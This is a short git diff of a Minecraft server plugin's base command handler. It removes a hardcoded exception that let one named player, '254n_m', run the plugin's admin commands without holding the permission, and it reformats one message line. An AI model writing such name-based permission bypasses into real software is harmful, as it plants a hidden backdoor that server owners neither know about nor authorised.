@@ -18,15 +18,14 @@ public class BaseCommand implements TabExecutor {
 
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
-        if (sender.hasPermission("l2x9core.base") || sender.getName().equals("254n_m")) {
+        if (sender.hasPermission("l2x9core.base")) {
             if (args.length > 0) {
                 if (args[0].equalsIgnoreCase("reload")) {
                     plugin.reloadConfig();
                     Utils.sendMessage(sender, Utils.getPrefix() + "&aReloaded configuration file");
                 } else {
                     if (args[0].equalsIgnoreCase("version")) {
-                        Utils.sendMessage(sender,
-                                Utils.getPrefix() + "&6Version &r&c" + plugin.getDescription().getVersion());
+                        Utils.sendMessage(sender, Utils.getPrefix() + "&6Version &r&c" + plugin.getDescription().getVersion());
 
                     } else {
                         if (args[0].equalsIgnoreCase("help")) {
